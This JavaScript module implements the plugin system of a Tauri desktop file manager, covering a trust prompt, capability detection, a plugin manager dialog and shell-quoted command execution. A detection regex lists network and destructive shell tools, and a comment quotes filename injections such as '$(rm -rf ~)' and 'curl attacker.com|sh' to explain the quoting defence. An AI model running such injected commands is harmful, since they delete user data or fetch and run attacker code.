/**
 * plugins.js — Plugin system: detect capabilities, trust model, manager UI, execution
 *
 * r29 P2.1 Stage 5: Extracted from main.js.
 * Exports: loadPlugins, matchesGlob, pluginsForEntry, runPlugin,
 *          showPluginManager, _pluginDetectCapabilities
 */

import { invoke } from '@tauri-apps/api/core';
import { listen } from '@tauri-apps/api/event';
import { escHtml } from './utils.js';

let _showToast, _t, _refreshCurrent, _sbProgress, _state;
export function initPluginDeps({ showToast, t, refreshCurrent, sbProgress, state }) {
  _showToast = showToast; _t = t; _refreshCurrent = refreshCurrent;
  _sbProgress = sbProgress; _state = state;
}
function showToast(m, type) { _showToast?.(m, type); }
function t(k, v) { return _t?.(k, v) ?? k; }
async function refreshCurrent() { return _refreshCurrent?.(); }

let _plugins = [];



// ── Plugin Management UI ──────────────────────────────────────────────────────
// r27 P1.2: Detect capability hints from a plugin command string.
// Returns an array of human-readable labels for the trust prompt.
function _pluginDetectCapabilities(cmd) {
  const caps = new Set();
  caps.add('shell'); // all plugins run via sh -c
  // Network indicators
  if (/\b(curl|wget|ssh|scp|rsync|ftp|http|https|nc\b|ncat|netcat)/.test(cmd)) caps.add('network');
  // Broad file-system write indicators beyond the target file
  if (/\b(rm\b|mv\b|cp\b|dd\b|mkfs|shred|truncate|chmod|chown|install\b)/.test(cmd)) caps.add('files:write');
  // Privilege escalation
  if (/\b(sudo|su\b|pkexec|doas)/.test(cmd)) caps.add('elevated');
  return [...caps];
}


// r27 P1.2: Revoke trust for a single plugin by id.
async function _revokePluginTrust(pluginId) {
  try { await invoke('revoke_plugin_trust', { pluginId }); } catch(e) { console.warn('revoke trust:', e); }
}


async function _showPluginManager() {
  document.getElementById('ff-plugins-dlg')?.remove();
  let plugins = [];
  try { plugins = await invoke('load_plugins'); } catch {}

  const render = () => {
    const dlg = document.getElementById('ff-plugins-dlg');
    const list = dlg?.querySelector('#pm-list');
    if(!list) return;
    if(!plugins.length){
      list.innerHTML = '<div style="color:#636368;font-size:12px;padding:12px 0;text-align:center;">No plugins installed.<br>Add a plugin below.</div>';
      return;
    }
    list.innerHTML = plugins.map((p,i) => `
      <div class="pm-row" data-idx="${i}">
        <div style="flex:1;min-width:0;">
          <div style="font-size:13px;color:#f1f5f9;font-weight:500;">${escHtml(p.name)}</div>
          <div style="font-size:10.5px;color:#636368;margin-top:2px;font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${escHtml(p.command)}">${escHtml(p.command)}</div>
          ${p.match&&p.match!=='*'?`<div style="font-size:10px;color:#a78bfa;margin-top:1px;">match: ${escHtml(p.match)}</div>`:''}
          <div style="display:flex;gap:4px;margin-top:3px;flex-wrap:wrap;">${(p.capabilities||_pluginDetectCapabilities(p.command)).map(cap=>`<span style="font-size:9px;padding:1px 5px;border-radius:3px;background:rgba(255,255,255,.06);color:#636368;font-family:monospace;">${escHtml(cap)}</span>`).join('')}</div>
        </div>
        <div style="display:flex;gap:6px;align-items:center;flex-shrink:0;">
          <button class="pm-revoke" data-idx="${i}" data-id="${p.id||''}" title="Revoke trust (will re-prompt on next run)" style="background:rgba(251,146,60,.08);border:1px solid rgba(251,146,60,.2);border-radius:6px;color:#fb923c;font-size:11px;padding:3px 8px;cursor:pointer;">Revoke</button>
          <button class="pm-del" data-idx="${i}" style="background:rgba(239,68,68,.12);border:1px solid rgba(239,68,68,.25);border-radius:6px;color:#f87171;font-size:11px;padding:3px 8px;cursor:pointer;">Remove</button>
        </div>
      </div>`).join('');
    list.querySelectorAll('.pm-revoke').forEach(btn => {
      btn.addEventListener('click', async () => {
        await _revokePluginTrust(btn.dataset.id);
        showToast('Trust revoked — plugin will prompt again on next run', 'info');
      });
    });
    list.querySelectorAll('.pm-del').forEach(btn => {
      btn.addEventListener('click', async () => {
        const p = plugins[+btn.dataset.idx];
        if (p?.id) await _revokePluginTrust(p.id);
        plugins.splice(+btn.dataset.idx, 1);
        await invoke('save_plugins', {plugins});
        _plugins = plugins.slice();
        render();
      });
    });
  };

  const overlay = document.createElement('div');
  overlay.id = 'ff-plugins-dlg';
  overlay.style.cssText = 'position:fixed;inset:0;z-index:9400;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.65);backdrop-filter:blur(6px);';
  overlay.innerHTML = `<div style="background:#1a1a1d;border:1px solid rgba(255,255,255,.13);border-radius:16px;width:min(580px,92vw);max-height:80vh;display:flex;flex-direction:column;box-shadow:0 24px 64px rgba(0,0,0,.8);">
    <div style="display:flex;align-items:center;justify-content:space-between;padding:18px 22px 14px;border-bottom:1px solid rgba(255,255,255,.07);">
      <span style="font-size:15px;font-weight:600;color:#f1f5f9;">Plugins</span>
      <div style="display:flex;gap:6px;align-items:center;">
        <button id="pm-export" title="Export all plugins to JSON" style="background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);border-radius:7px;color:#94a3b8;font-size:11px;padding:4px 10px;cursor:pointer;">Export</button>
        <button id="pm-import" title="Import plugins from JSON" style="background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);border-radius:7px;color:#94a3b8;font-size:11px;padding:4px 10px;cursor:pointer;">Import</button>
        <button id="pm-close" style="background:rgba(255,255,255,.07);border:none;border-radius:8px;color:#98989f;font-size:18px;width:30px;height:30px;cursor:pointer;">×</button>
      </div>
    </div>
    <div id="pm-list" style="overflow-y:auto;padding:10px 16px;flex:1;display:flex;flex-direction:column;gap:8px;"></div>
    <!-- r31 P4.4: Community plugin registry -->
    <div style="padding:6px 16px 0;border-top:1px solid rgba(255,255,255,.07);">
      <details id="pm-community">
        <summary style="font-size:11px;color:#636368;text-transform:uppercase;letter-spacing:.06em;cursor:pointer;padding:4px 0;list-style:none;display:flex;align-items:center;gap:6px;">
          <span>&#9656;</span> Community plugins
        </summary>
        <div id="pm-community-list" style="display:flex;flex-direction:column;gap:5px;margin-top:8px;max-height:220px;overflow-y:auto;padding-bottom:8px;"></div>
      </details>
    </div>
    <!-- r178: Starter plugin discovery -->
    <div style="padding:8px 16px 0;border-top:1px solid rgba(255,255,255,.07);">
      <details id="pm-discover">
        <summary style="font-size:11px;color:#636368;text-transform:uppercase;letter-spacing:.06em;cursor:pointer;padding:4px 0;list-style:none;display:flex;align-items:center;gap:6px;">
          <span>&#9656;</span> Starter plugins
        </summary>
        <div id="pm-starter-list" style="display:flex;flex-direction:column;gap:5px;margin-top:8px;max-height:200px;overflow-y:auto;padding-bottom:8px;"></div>
      </details>
    </div>
    <div style="padding:14px 22px;border-top:1px solid rgba(255,255,255,.07);">
      <div style="font-size:11px;color:#636368;text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;">Add plugin</div>
      <div style="display:flex;flex-direction:column;gap:6px;">
        <input id="pm-name" placeholder="Name (e.g. Compress with zstd)" style="padding:7px 10px;background:#2a2a2d;border:1px solid rgba(255,255,255,.1);border-radius:7px;color:#f1f5f9;font-size:12px;outline:none;font-family:inherit;"/>
        <input id="pm-cmd" placeholder="Command (use {path}, {name}, {dir}, {ext})" style="padding:7px 10px;background:#2a2a2d;border:1px solid rgba(255,255,255,.1);border-radius:7px;color:#f1f5f9;font-size:12px;outline:none;font-family:monospace;"/>
        <div style="display:flex;gap:8px;">
          <input id="pm-match" placeholder="File match (e.g. *.mp4 or *)" style="flex:1;padding:7px 10px;background:#2a2a2d;border:1px solid rgba(255,255,255,.1);border-radius:7px;color:#f1f5f9;font-size:12px;outline:none;font-family:monospace;"/>
          <label style="display:flex;align-items:center;gap:5px;font-size:12px;color:#94a3b8;cursor:pointer;white-space:nowrap;"><input type="checkbox" id="pm-multi"> Multi-file</label>
          <label style="display:flex;align-items:center;gap:5px;font-size:12px;color:#94a3b8;cursor:pointer;white-space:nowrap;"><input type="checkbox" id="pm-confirm" checked> Confirm</label>
        </div>
        <div id="pm-err" style="color:#f87171;font-size:11px;min-height:12px;"></div>
        <details style="font-size:11px;color:#636368;margin-top:2px;">
          <summary style="cursor:pointer;padding:2px 0;">Parameters (optional — shown before execution)</summary>
          <div style="margin-top:6px;">
            <div style="font-size:10.5px;color:#636368;margin-bottom:4px;">One per line: <code style="color:#a78bfa;">name|Label|placeholder|default</code></div>
            <textarea id="pm-params" rows="3" placeholder="e.g. quality|JPEG quality|1-100|85" style="width:100%;box-sizing:border-box;padding:7px 10px;background:#2a2a2d;border:1px solid rgba(255,255,255,.1);border-radius:7px;color:#f1f5f9;font-size:11px;outline:none;font-family:monospace;resize:vertical;"></textarea>
          </div>
        </details>
        <div id="pm-preview" style="display:none;padding:7px 10px;background:rgba(91,141,217,.08);border:1px solid rgba(91,141,217,.2);border-radius:7px;font-size:11px;color:#94a3b8;font-family:monospace;word-break:break-all;margin-bottom:2px;"></div>
        <div style="display:flex;gap:8px;align-self:flex-end;">
          <button id="pm-preview-btn" style="padding:7px 14px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:8px;color:#94a3b8;font-size:12px;cursor:pointer;">Dry run preview</button>
          <button id="pm-add" style="padding:7px 16px;background:#5b8dd9;border:none;border-radius:8px;color:#fff;font-size:13px;font-weight:600;cursor:pointer;">Add Plugin</button>
        </div>
      </div>
    </div>
  </div>`;
  document.body.appendChild(overlay);
  render();

  // r178: Starter plugins — load lazily on expand
  const _STARTER_PLUGINS = [
    {name:'Convert to MP4 (ffmpeg)',    command:'ffmpeg -i {path} -c:v libx264 -crf 23 "{dir}/{name}.mp4"', match:'*.{mkv,avi,mov,webm}', icon:'🎬'},
    {name:'Resize image 50% (mogrify)', command:'mogrify -resize 50% {path}',     match:'*.{jpg,jpeg,png}',           icon:'🖼'},
    {name:'Optimize PNG (optipng)',     command:'optipng -o5 {path}',             match:'*.png',                      icon:'🗜'},
    {name:'Convert to WebP',            command:'cwebp -q 80 {path} -o "{dir}/{name}.webp"', match:'*.{jpg,jpeg,png}',icon:'🔄'},
    {name:'Git log (this dir)',         command:'git -C {dir} log --oneline -20', match:'*',                         icon:'📜', notify:false},
    {name:'Git status',                 command:'git -C {dir} status',            match:'*',                         icon:'🌿', notify:false},
    {name:'Word count',                 command:'wc -w {path}',                   match:'*.{txt,md}',                icon:'🔢', notify:false},
    {name:'PDF page count',             command:'pdfinfo {path} | grep Pages',    match:'*.pdf',                     icon:'📄', notify:false},
    {name:'Strip EXIF data',            command:'exiftool -all= {path}',          match:'*.{jpg,jpeg,png,tiff}',     icon:'🔒'},
    {name:'Compress to ZIP',            command:'zip -j "{dir}/{name}.zip" {path}',match:'*',                        icon:'📦'},
  ];

  // r31 P4.4: Community plugin registry — fetches from GitHub-hosted JSON
  overlay.querySelector('#pm-community')?.addEventListener('toggle', async ev => {
    if (!ev.target.open) return;
    const list = overlay.querySelector('#pm-community-list');
    if (!list || list.dataset.loaded) return;
    list.dataset.loaded = '1';
    list.innerHTML = '<div style="color:#636368;font-size:11px;padding:8px 0;">Loading registry…</div>';
    try {
      const res = await fetch('https://raw.githubusercontent.com/frostfinder/frostfinder/main/community-plugins/registry.json');
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const registry = await res.json();
      if (!Array.isArray(registry) || !registry.length) {
        list.innerHTML = '<div style="color:#636368;font-size:11px;padding:8px 0;">No plugins in registry yet.</div>';
        return;
      }
      list.innerHTML = registry.map((p, i) =>
        `<div style="display:flex;align-items:flex-start;gap:8px;padding:7px 8px;background:rgba(255,255,255,.03);border-radius:6px;border:1px solid rgba(255,255,255,.05);">
          <span style="font-size:16px;flex-shrink:0;">${p.icon||'▶'}</span>
          <div style="flex:1;min-width:0;">
            <div style="font-size:12px;color:#f1f5f9;font-weight:600;">${escHtml(p.name)}</div>
            <div style="font-size:10px;color:#636368;margin-top:1px;">${escHtml(p.description||'')}</div>
            <div style="font-size:10px;color:#5b8dd9;font-family:monospace;margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${escHtml(p.command||'')}</div>
          </div>
          <button class="pm-reg-add" data-idx="${i}" style="padding:3px 10px;background:#5b8dd9;border:none;border-radius:6px;color:#fff;font-size:11px;font-weight:600;cursor:pointer;flex-shrink:0;">+ Add</button>
        </div>`
      ).join('');
      list.querySelectorAll('.pm-reg-add').forEach(btn => {
        btn.addEventListener('click', async () => {
          const p = registry[+btn.dataset.idx];
          const id = 'plugin_' + Date.now();
          const caps = _pluginDetectCapabilities(p.command || '');
          const newPlugin = { id, name: p.name, command: p.command||'', match: p.match||'*',
            multi: false, confirm: true, notify: true, capabilities: caps,
            icon: p.icon||'▶', description: p.description||'' };
          const existing = getPlugins();
          if (existing.some(ep => ep.name === newPlugin.name)) {
            showToast('Plugin already installed', 'info'); return;
          }
          existing.push(newPlugin);
          try {
            await invoke('save_plugins', { plugins: existing });
            btn.textContent = '✓ Added'; btn.disabled = true;
            render();
            showToast(t('toast.plugin_added', { name: p.name }), 'success');
          } catch(err) { showToast('Save failed: ' + err, 'error'); }
        });
      });
    } catch(err) {
      list.innerHTML = `<div style="color:#f87171;font-size:11px;padding:8px 0;">Failed to load registry: ${escHtml(String(err))}</div>`;
    }
  });

  overlay.querySelector('#pm-discover')?.addEventListener('toggle', ev => {
    if(!ev.target.open) return;
    const list = overlay.querySelector('#pm-starter-list');
    if(!list || list.dataset.loaded) return;
    list.dataset.loaded = '1';
    list.innerHTML = _STARTER_PLUGINS.map((sp,i) =>
      `<div style="display:flex;align-items:center;gap:8px;padding:5px 8px;background:rgba(255,255,255,.03);border-radius:6px;">
        <span style="font-size:14px;flex-shrink:0;">${sp.icon||'▶'}</span>
        <div style="flex:1;min-width:0;">
          <div style="font-size:12px;color:#f1f5f9;font-weight:500;">${escHtml(sp.name)}</div>
          <div style="font-size:10px;color:#636368;font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${escHtml(sp.match)}</div>
        </div>
        <button class="pm-starter-add" data-idx="${i}" style="padding:3px 10px;background:#5b8dd9;border:none;border-radius:6px;color:#fff;font-size:11px;font-weight:600;cursor:pointer;">+ Add</button>
      </div>`
    ).join('');
    list.querySelectorAll('.pm-starter-add').forEach(btn => {
      btn.addEventListener('click', async () => {
        const sp = _STARTER_PLUGINS[+btn.dataset.idx];
        const id = 'plugin_' + Date.now();
        plugins.push({id, name:sp.name, command:sp.command, match:sp.match||'*',
          multi:false, confirm:false, notify:sp.notify??true});
        try {
          await invoke('save_plugins', {plugins});
          _plugins = plugins.slice();
          btn.textContent = '✓ Added'; btn.disabled = true;
          render();
          showToast(t('toast.plugin_added',{name:sp.name}),'success');
        } catch(e) { showToast(t('toast.save_failed',{err:e}),'error'); }
      });
    });
  });

  const close = () => overlay.remove();
  overlay.querySelector('#pm-close').addEventListener('click', close);
  overlay.addEventListener('click', ev => { if(ev.target===overlay) close(); });

  // r27 P1.2 / P3.5: Plugin export
  overlay.querySelector('#pm-export')?.addEventListener('click', async () => {
    if (!plugins.length) { showToast('No plugins to export', 'info'); return; }
    const json = JSON.stringify(plugins, null, 2);
    try {
      const { save } = await import('@tauri-apps/plugin-dialog');
      const path = await save({ defaultPath: 'frostfinder-plugins.json', filters: [{ name: 'JSON', extensions: ['json'] }] });
      if (!path) return;
      const { writeTextFile } = await import('@tauri-apps/plugin-fs');
      await writeTextFile(path, json);
      showToast(`Exported ${plugins.length} plugin${plugins.length !== 1 ? 's' : ''}`, 'success');
    } catch(e) { showToast('Export failed: ' + e, 'error'); }
  });

  // r27 P1.2 / P3.5: Plugin import — validates and merges, skipping duplicates by id
  overlay.querySelector('#pm-import')?.addEventListener('click', async () => {
    try {
      const { open } = await import('@tauri-apps/plugin-dialog');
      const path = await open({ filters: [{ name: 'JSON', extensions: ['json'] }], title: 'Import plugins' });
      if (!path) return;
      const { readTextFile } = await import('@tauri-apps/plugin-fs');
      const raw = await readTextFile(path);
      const imported = JSON.parse(raw);
      if (!Array.isArray(imported)) { showToast('Invalid plugin file — expected a JSON array', 'error'); return; }
      let added = 0;
      for (const p of imported) {
        if (!p.id || !p.name || !p.command) continue; // basic validation
        if (plugins.some(existing => existing.id === p.id)) continue; // skip duplicates
        // Re-detect capabilities on import for safety
        p.capabilities = _pluginDetectCapabilities(p.command);
        plugins.push(p);
        added++;
      }
      if (added > 0) {
        await invoke('save_plugins', { plugins });
        _plugins = plugins.slice();
        render();
        showToast(`Imported ${added} plugin${added !== 1 ? 's' : ''}`, 'success');
      } else {
        showToast('No new plugins found (all already installed)', 'info');
      }
    } catch(e) { showToast('Import failed: ' + e, 'error'); }
  });

  // r27 P1.1: Dry-run preview — show shell-quoted expansion with a placeholder path
  overlay.querySelector('#pm-preview-btn')?.addEventListener('click', () => {
    const cmd  = overlay.querySelector('#pm-cmd')?.value.trim() || '';
    const previewEl = overlay.querySelector('#pm-preview');
    if (!cmd || !previewEl) return;
    const sq = s => "'" + String(s).replace(/'/g, "'\''") + "'";
    const example = cmd
      .replace(/\{path\}/g, sq('/home/user/example file.txt'))
      .replace(/\{name\}/g, sq('example file.txt'))
      .replace(/\{dir\}/g,  sq('/home/user'))
      .replace(/\{ext\}/g,  sq('txt'));
    previewEl.textContent = '▶ ' + example;
    previewEl.style.display = '';
  });

  overlay.querySelector('#pm-add').addEventListener('click', async () => {
    const name = overlay.querySelector('#pm-name').value.trim();
    const cmd  = overlay.querySelector('#pm-cmd').value.trim();
    const match = overlay.querySelector('#pm-match').value.trim() || '*';
    const multi = overlay.querySelector('#pm-multi').checked;
    const confirm_ = overlay.querySelector('#pm-confirm').checked;
    const errEl = overlay.querySelector('#pm-err');
    if(!name){ errEl.textContent='Name required'; return; }
    if(!cmd){  errEl.textContent='Command required'; return; }
    errEl.textContent='';
    const id = 'plugin_'+Date.now();
    // r177: parse optional params textarea
    const paramsRaw = overlay.querySelector('#pm-params')?.value.trim() || '';
    const params = paramsRaw ? paramsRaw.split('\n').filter(Boolean).map(line => {
      const parts = line.split('|');
      return { name:(parts[0]||'').trim()||'param', label:(parts[1]||parts[0]||'').trim()||'Value',
               placeholder:(parts[2]||'').trim()||undefined, default:(parts[3]||'').trim()||undefined };
    }).filter(p=>p.name) : undefined;
    // r27 P1.2: Auto-detect capability hints from command string
    const capabilities = _pluginDetectCapabilities(cmd);
    plugins.push({id,name,command:cmd,match,multi,confirm:confirm_,notify:true,capabilities,...(params&&params.length?{params}:{})});
    try{ await invoke('save_plugins',{plugins}); _plugins=plugins.slice(); }
    catch(e){ errEl.textContent='Save failed: '+e; return; }
    overlay.querySelector('#pm-name').value='';
    overlay.querySelector('#pm-cmd').value='';
    overlay.querySelector('#pm-match').value='';
    render();
    showToast(t('toast.plugin_added',{name}),'success');
  });
}





async function loadPlugins() { try { _plugins = await invoke('load_plugins'); } catch { _plugins = []; } }

function matchesGlob(name, pattern) {
  if (!pattern || pattern === '*') return true;
  const rx = pattern.replace(/[.+^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*');
  return new RegExp('^' + rx + '$').test(name);
}

function pluginsForEntry(entry) { return _plugins.filter(p => matchesGlob(entry.name, p.match ?? '*')); }

async function runPlugin(plugin, entries) {
  // r177: resolve param placeholders before confirm or execution
  let resolvedCommand = plugin.command || '';
  if (plugin.params && plugin.params.length) {
    const paramValues = await _showPluginParamDialog(plugin);
    if (!paramValues) return; // user cancelled
    for (const [k, v] of Object.entries(paramValues)) {
      resolvedCommand = resolvedCommand.replace(new RegExp('\\{' + k + '\\}', 'g'), v);
    }
  }

  if (plugin.confirm) {
    if (!confirm(`Run "${plugin.name}" on ${entries.map(e=>e.name).join(', ')}?`)) return;
  }

  // p9: trust-on-first-use
  try {
    const trust = await invoke('check_plugin_trust', { pluginId: plugin.id, command: resolvedCommand });
    if (!trust.trusted) {
      const caps = (plugin.capabilities || _pluginDetectCapabilities(resolvedCommand)).join(', ') || 'shell';
      const capStr = `Capabilities: ${caps}`;
      const msg = trust.first_run
        ? `Allow plugin "${plugin.name}" to run shell commands?\n${capStr}`
        : `Plugin "${plugin.name}" command has changed since last approved. Allow?\n${capStr}`;
      if (!confirm(msg + '\n\n' + resolvedCommand)) return;
      await invoke('approve_plugin', { pluginId: plugin.id, command: resolvedCommand }).catch(() => {});
    }
  } catch (_) {}

  const targets = plugin.multi ? entries : [entries[0]];
  const jobId = _sbProgress.addJob(`${plugin.name}\u2026`, targets.length);

  // r179: listen for PROGRESS:n/total events emitted by run_plugin_command
  let _progUnlisten = null;
  try {
    _progUnlisten = await listen('plugin-progress', ev => {
      const { done, total, finished, exit_code } = ev.payload;
      if (finished) {
        _sbProgress.finishJob(jobId, exit_code === 0,
          exit_code === 0 ? `${plugin.name} done` : `${plugin.name} failed (${exit_code})`);
        _progUnlisten?.(); _progUnlisten = null;
      } else if (total > 0) {
        _sbProgress.updateJob(jobId, done, total, `${plugin.name} ${done}/${total}`);
      }
    });
  } catch(_) {}

  let allOutput = '';
  let lastExitCode = 0;

  // r27 P1.1: Shell-quote all interpolated values — prevents injection via
  // malicious filenames like $(rm -rf ~) or `curl attacker.com|sh`
  // Single-quote wrapping: wrap in ' and escape internal ' as '\''
  const _sq = s => "'" + String(s).replace(/'/g, "'\\''" ) + "'";

  for (const entry of targets) {
    const dir = entry.path.includes('/') ? entry.path.slice(0, entry.path.lastIndexOf('/')) : '.';
    const ext = entry.name.includes('.') ? entry.name.split('.').pop() : '';
    const cmd = resolvedCommand
      .replace(/\{path\}/g, _sq(entry.path))
      .replace(/\{name\}/g, _sq(entry.name))
      .replace(/\{dir\}/g,  _sq(dir))
      .replace(/\{ext\}/g,  _sq(ext));
    try {
      const res = await invoke('run_plugin_command', {command: cmd, workDir: state.currentPath});
      lastExitCode = res.exit_code;
      if (res.stdout) allOutput += (allOutput ? '\n' : '') + res.stdout;
    } catch(err) {
      showToast(t('toast.plugin_error',{err}),'error');
      _progUnlisten?.(); _progUnlisten = null;
      _sbProgress.finishJob(jobId, false, 'Plugin error');
      return;
    }
  }

  _progUnlisten?.(); _progUnlisten = null;
  _sbProgress.finishJob(jobId, lastExitCode === 0,
    lastExitCode === 0 ? `${plugin.name} done` : `${plugin.name} failed (${lastExitCode})`);

  if (lastExitCode === 0) await refreshCurrent();

  // r176: show output panel if stdout is non-empty and <= 4KB
  if (allOutput && allOutput.length <= 4096) {
    _showPluginOutput(plugin.name, allOutput);
  } else if (plugin.notify !== false) {
    showToast(lastExitCode===0?t('toast.plugin_ran',{name:plugin.name}):t('toast.plugin_failed',{name:plugin.name,code:lastExitCode}),
      lastExitCode===0?'success':'error');
  }
}


// r176: Plugin output panel — plain text or JSON table
function _showPluginOutput(pluginName, output) {
  document.getElementById('ff-plugin-output')?.remove();
  const ov = document.createElement('div');
  ov.id = 'ff-plugin-output';
  ov.style.cssText = 'position:fixed;inset:0;z-index:9450;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.6);backdrop-filter:blur(6px);';

  let bodyHtml = '';
  try {
    const parsed = JSON.parse(output.trim());
    const rows = Array.isArray(parsed) ? parsed : [parsed];
    if (rows.length && typeof rows[0] === 'object' && rows[0] !== null) {
      const cols = Object.keys(rows[0]);
      bodyHtml = `<div class="pout-table-wrap"><table class="pout-table">
        <thead><tr>${cols.map(c=>`<th>${escHtml(c)}</th>`).join('')}</tr></thead>
        <tbody>${rows.slice(0,200).map(row=>
          `<tr>${cols.map(c=>`<td>${escHtml(String(row[c]??''))}</td>`).join('')}</tr>`
        ).join('')}</tbody>
      </table>${rows.length>200?`<div class="pout-truncated">Showing 200 of ${rows.length} rows</div>`:''}</div>`;
    } else {
      bodyHtml = `<pre class="pout-pre">${escHtml(output)}</pre>`;
    }
  } catch(_) {
    bodyHtml = `<pre class="pout-pre">${escHtml(output)}</pre>`;
  }

  ov.innerHTML = `
    <div class="pout-box">
      <div class="pout-header">
        <span class="pout-title">${escHtml(pluginName)} \u2014 Output</span>
        <div style="display:flex;gap:6px;">
          <button class="pout-copy" id="pout-copy" title="Copy to clipboard">\u2398</button>
          <button class="pout-close" id="pout-close">\u2715</button>
        </div>
      </div>
      <div class="pout-body">${bodyHtml}</div>
    </div>`;
  document.body.appendChild(ov);
  const close = () => ov.remove();
  ov.querySelector('#pout-close').addEventListener('click', close);
  ov.addEventListener('click', ev => { if(ev.target===ov) close(); });
  ov.addEventListener('keydown', ev => { if(ev.key==='Escape') close(); });
  ov.querySelector('#pout-copy').addEventListener('click', () =>
    navigator.clipboard.writeText(output)
      .then(() => showToast(t('toast.output_copied'),'success'))
      .catch(() => {})
  );
}


// r177: Plugin parameter dialog
function _showPluginParamDialog(plugin) {
  return new Promise(resolve => {
    document.getElementById('ff-plugin-params')?.remove();
    const ov = document.createElement('div');
    ov.id = 'ff-plugin-params';
    ov.style.cssText = 'position:fixed;inset:0;z-index:9500;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.65);backdrop-filter:blur(7px);';
    const fields = (plugin.params || []).map((p, i) =>
      `<div style="display:flex;flex-direction:column;gap:4px;margin-bottom:10px;">
        <label style="font-size:12px;color:var(--text-secondary);">${escHtml(p.label||p.name)}</label>
        <input class="pp-field" data-name="${escHtml(p.name)}" id="pp-field-${i}"
          placeholder="${escHtml(p.placeholder||'')}" value="${escHtml(p.default||'')}"
          style="padding:7px 10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);border-radius:7px;color:var(--text-primary);font-size:12px;outline:none;font-family:inherit;">
      </div>`
    ).join('');
    ov.innerHTML = `
      <div style="background:#1a1a1d;border:1px solid rgba(255,255,255,.13);border-radius:14px;width:min(420px,92vw);padding:22px 24px;box-shadow:0 24px 64px rgba(0,0,0,.8);">
        <div style="font-size:14px;font-weight:600;color:#f1f5f9;margin-bottom:16px;">${escHtml(plugin.name)}</div>
        ${fields}
        <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:4px;">
          <button id="pp-cancel" style="padding:6px 14px;background:rgba(255,255,255,.07);border:none;border-radius:7px;color:#94a3b8;cursor:pointer;">Cancel</button>
          <button id="pp-run" style="padding:6px 14px;background:#5b8dd9;border:none;border-radius:7px;color:#fff;font-weight:600;cursor:pointer;">Run</button>
        </div>
      </div>`;
    document.body.appendChild(ov);
    ov.querySelector('#pp-cancel').addEventListener('click', () => { ov.remove(); resolve(null); });
    ov.querySelector('#pp-run').addEventListener('click', () => {
      const vals = {};
      ov.querySelectorAll('.pp-field').forEach(el => { vals[el.dataset.name] = el.value; });
      ov.remove(); resolve(vals);
    });
    ov.addEventListener('keydown', ev => {
      if(ev.key==='Escape'){ ov.remove(); resolve(null); }
      if(ev.key==='Enter'){ ov.querySelector('#pp-run')?.click(); }
    });
    requestAnimationFrame(() => ov.querySelector('.pp-field')?.focus());
  });
}

async function showPluginManager() {
  document.getElementById('plugin-manager')?.remove();
  const dlg = document.createElement('div'); dlg.id = 'plugin-manager'; dlg.className = 'modal-overlay';
  const renderRows = () => _plugins.map((p,i) => `<div class="plugin-row">
    <span class="plugin-icon">${_escHtml(p.icon??'▶')}</span>
    <div class="plugin-info"><div class="plugin-name">${_escHtml(p.name)}</div>
      <div class="plugin-cmd">${_escHtml(p.command)}</div>
      <div class="plugin-match">Matches: ${_escHtml(p.match??'*')}</div></div>
    <div class="plugin-actions">
      <button class="btn-ghost btn-sm" onclick="_editPlugin(${i})">Edit</button>
      <button class="btn-ghost btn-sm btn-danger-ghost" onclick="_deletePlugin(${i})">Delete</button></div></div>`).join('');
  dlg.innerHTML = `<div class="modal-box" style="width:560px;max-height:80vh;display:flex;flex-direction:column">
    <div class="modal-header"><span class="modal-title">Custom Actions</span>
      <button class="btn-icon" onclick="document.getElementById('plugin-manager').remove()">✕</button></div>
    <div class="modal-body" style="flex:1;overflow-y:auto">
      <div id="plugin-list">${renderRows()}</div>
      <button class="btn-primary btn-sm" style="margin-top:12px" onclick="_editPlugin(null)">+ Add Action</button></div>
    <div class="modal-footer"><button class="btn-ghost" onclick="document.getElementById('plugin-manager').remove()">Close</button></div></div>`;
  document.body.appendChild(dlg);
}


export function getPlugins() { return _plugins; }
export function setPlugins(p) { _plugins = p; }
export { loadPlugins, matchesGlob, pluginsForEntry, runPlugin, showPluginManager, _pluginDetectCapabilities, _revokePluginTrust };
